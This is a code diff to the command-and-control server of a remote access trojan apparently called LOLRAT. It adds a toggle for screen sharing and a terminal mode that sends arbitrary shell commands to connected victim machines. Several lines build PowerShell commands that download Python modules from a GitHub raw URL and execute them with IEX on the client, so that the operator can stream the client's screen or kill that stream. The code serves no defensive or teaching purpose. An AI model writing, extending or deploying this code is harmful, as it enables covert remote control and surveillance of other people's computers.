@@ -27,6 +27,7 @@ namespace LOLRAT_C2
         bool isListening = false;
         bool isMainC2 = true;
         int clientIDCounter = 1; // Counter for client identifiers
+        string ActiveWindow;
 
         public Main()
         {
@@ -109,7 +110,6 @@ namespace LOLRAT_C2
                 server.Stop();
             }
         }
-
         private void ListenForClients()
         {
             if (!isListening)
@@ -118,7 +118,6 @@ namespace LOLRAT_C2
                 listenThread.Start();
             }
         }
-
         private void StopListening()
         {
             isListening = false;
@@ -155,29 +154,51 @@ namespace LOLRAT_C2
         // ---------------------------------------------------------------------------
         private void btnSS_Click(object sender, EventArgs e)
         {
-            // Ask user for input on ip and port
-            string IP = Microsoft.VisualBasic.Interaction.InputBox("Enter IP (or DNS)", "IP/DNS", "");
-            string PORT = Microsoft.VisualBasic.Interaction.InputBox("Enter Port", "Port", "");
-
-            // Start the SS form
-            txtOutput.AppendText("Starting image sharing form...\r\n");
-            SS ss = new SS();
-            ss.Show();
-
-            // Send the SS command to selected client
-            txtOutput.AppendText("Sending SS command to client...\r\n");
-            DataGridViewRow selectedRow = dgvClients.SelectedRows[0];
-            string clientIP = selectedRow.Cells["IP"].Value.ToString();
-            int clientPort = int.Parse(selectedRow.Cells["Port"].Value.ToString());
-            ClientInfo selectedClient = FindClientByIPAndPort(clientIP, clientPort);
-            if (selectedClient != null)
+            // Check if SS is already running
+            if (Application.OpenForms.OfType<SS>().Any())
             {
-                byte[] data = Encoding.ASCII.GetBytes("exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/ss.py\").Content " + IP + " " + PORT + "'\"");
-                selectedClient.Stream.Write(data, 0, data.Length);
-                txtOutput.AppendText("Sent command to client!\r\n");
+                txtOutput.AppendText("SS is already running!\r\n");
+                // Close the SS that is running
+                Application.OpenForms["SS"].Close();
+                // Send a command to client to stop SS
+                txtOutput.AppendText("Sending SS command to client...\r\n");
+                DataGridViewRow selectedRow = dgvClients.SelectedRows[0];
+                string clientIP = selectedRow.Cells["IP"].Value.ToString();
+                int clientPort = int.Parse(selectedRow.Cells["Port"].Value.ToString());
+                ClientInfo selectedClient = FindClientByIPAndPort(clientIP, clientPort);
+                if (selectedClient != null)
+                {
+                    // Create a command that kills all other python processes
+                    byte[] data = Encoding.ASCII.GetBytes("exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/kill_ss.py\").Content'\"");
+                    selectedClient.Stream.Write(data, 0, data.Length);
+                    txtOutput.AppendText("Sent command to client!\r\n");
+                }
             }
-            txtOutput.AppendText("Hopefully that worked...\r\n");
+            else
+            {
+                // Ask user for input on ip and port
+                string IP = Microsoft.VisualBasic.Interaction.InputBox("Enter IP (or DNS)", "IP/DNS", "");
+                string PORT = Microsoft.VisualBasic.Interaction.InputBox("Enter Port", "Port", "");
 
+                // Start the SS form
+                txtOutput.AppendText("Starting image sharing form...\r\n");
+                SS ss = new SS();
+                ss.Show();
+
+                // Send the SS command to selected client
+                txtOutput.AppendText("Sending SS command to client...\r\n");
+                DataGridViewRow selectedRow = dgvClients.SelectedRows[0];
+                string clientIP = selectedRow.Cells["IP"].Value.ToString();
+                int clientPort = int.Parse(selectedRow.Cells["Port"].Value.ToString());
+                ClientInfo selectedClient = FindClientByIPAndPort(clientIP, clientPort);
+                if (selectedClient != null)
+                {
+                    byte[] data = Encoding.ASCII.GetBytes("exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/ss.py\").Content " + IP + " " + PORT + "'\"");
+                    selectedClient.Stream.Write(data, 0, data.Length);
+                    txtOutput.AppendText("Sent command to client!\r\n");
+                }
+                txtOutput.AppendText("Hopefully that worked...\r\n");
+            }
         }
 
 
@@ -234,16 +255,26 @@ namespace LOLRAT_C2
                             string clientIP = selectedRow.Cells["IP"].Value.ToString();
                             int clientPort = int.Parse(selectedRow.Cells["Port"].Value.ToString());
 
-                            // Find the corresponding client from your client list (if you have one)
-                            // This code assumes you have a list of connected clients.
-                            // Replace it with your actual data structure.
+                            // Find the corresponding client from the client list
                             ClientInfo selectedClient = FindClientByIPAndPort(clientIP, clientPort);
 
                             // Check if the selected client was found
                             if (selectedClient != null)
                             {
-                                byte[] data = Encoding.ASCII.GetBytes(txtCommand.Text);
-                                selectedClient.Stream.Write(data, 0, data.Length);
+                                if (ActiveWindow == "Debug")
+                                {
+                                    byte[] data = Encoding.ASCII.GetBytes(txtCommand.Text);
+                                    selectedClient.Stream.Write(data, 0, data.Length);
+                                    txtOutput.AppendText("Executed this: " + txtCommand.Text + "\r\n");
+                                }
+                                else if (ActiveWindow == "Terminal")
+                                {
+                                    string Command = ("exec$" + txtCommand.Text);
+                                    byte[] data = Encoding.ASCII.GetBytes(Command);
+                                    selectedClient.Stream.Write(data, 0, data.Length);
+                                    txtOutput.AppendText("Executed this: " + Command + "\r\n");
+                                }
+
                             }
                         }
                     }
@@ -512,6 +543,8 @@ namespace LOLRAT_C2
             btnSend.Visible = false;
             gbCommandSending.Visible = false;
             dgvClients.Visible = true;
+            ActiveWindow = "Clients";
+            gbClientBox.Text = "Clients";
         }
 
         private void btnShowDebug_Click(object sender, EventArgs e)
@@ -524,6 +557,8 @@ namespace LOLRAT_C2
             txtCommand.Visible = true;
             btnSend.Visible = true;
             gbCommandSending.Visible = true;
+            ActiveWindow = "Debug";
+            gbClientBox.Text = "Debug";
         }
 
         private void btnShowTerminal_Click(object sender, EventArgs e)
@@ -536,6 +571,8 @@ namespace LOLRAT_C2
             txtCommand.Visible = true;
             btnSend.Visible = true;
             gbCommandSending.Visible = true;
+            ActiveWindow = "Terminal";
+            gbClientBox.Text = "Terminal";
         }
 
 
